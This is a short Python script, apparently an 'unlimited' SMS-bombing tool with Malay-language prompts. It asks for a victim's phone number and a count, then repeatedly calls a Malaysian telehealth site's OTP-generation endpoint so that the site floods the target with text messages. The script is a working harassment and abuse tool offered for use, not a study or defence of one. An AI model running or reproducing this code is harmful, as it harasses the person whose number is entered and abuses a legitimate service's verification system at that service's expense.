import requests,os,sys,time

os.system('clear')
banner = """
            .-.   _           _  .-.          .-.
            : :  :_;         :_;.' `.         : :
.-..-.,-.,-.: :  .-.,-.,-.,-..-.`. .' .--.  .-' :
: :; :: ,. :: :_ : :: ,. ,. :: : : : ' '_.'' .; :
`.__.':_;:_;`.__;:_;:_;:_;:_;:_; :_; `.__.'`.__.'
"""

print(banner)
nomor = input(" [✆] No Target (Ex : 01××××××××):")
jumlah = int(input(" [✉] Jumlah (Ex : Unlimited):"))
time.sleep(2)
url = "https://www.doctoroncall.com.my/otp/generate?countryCode=60"
data = {
       "mobile":nomor
       }
time.sleep(1)
for i in range(jumlah):
     requests.get(url,data).text
     print(" ⦗SMS BERJAYA DIKIRIM KE TARGET⦘ ⦗{✓}⦘ ✈ ✉ ")
     time.sleep(3) 
     print(" ⦗SMS BERJAYA DIKIRIM..........⦘ ⦗{✓}⦘ ✈ ✉ ")


